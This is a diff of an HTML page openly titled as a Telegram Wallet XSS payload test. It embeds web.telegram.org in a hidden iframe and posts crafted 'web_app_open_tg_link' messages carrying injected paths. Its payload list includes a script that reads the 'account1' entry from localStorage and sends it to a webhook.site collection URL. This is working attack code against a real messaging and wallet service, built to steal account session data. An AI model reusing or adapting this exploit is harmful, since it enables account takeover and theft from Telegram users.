@@ -1,9 +1,12 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Telegram Wallet XSS Payload Test</title>
+  </head>
   <body>
     <h1>Testing Payloads...</h1>
     <iframe id="tg_frame" src="https://web.telegram.org/a/" style="display:none;"></iframe>
-    
+
     <script>
       const payloads = [
         "data:text/html,<script>fetch('https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4?data='+encodeURIComponent(localStorage.getItem('account1')))</script>",
@@ -16,7 +19,7 @@
         const testPayload = payloads[index];
         console.log("🚀 Testing payload:", testPayload);
 
-        const payload = JSON.stringify({
+        const message = JSON.stringify({
           eventType: 'web_app_open_tg_link',
           eventData: {
             path_full: `/wallet/start?x=${encodeURIComponent(testPayload)}`
@@ -24,7 +27,7 @@
         });
 
         const iframe = document.getElementById("tg_frame");
-        iframe.contentWindow.postMessage(payload, "*");
+        iframe.contentWindow.postMessage(message, "*");
 
         index++;
         if (index < payloads.length) {
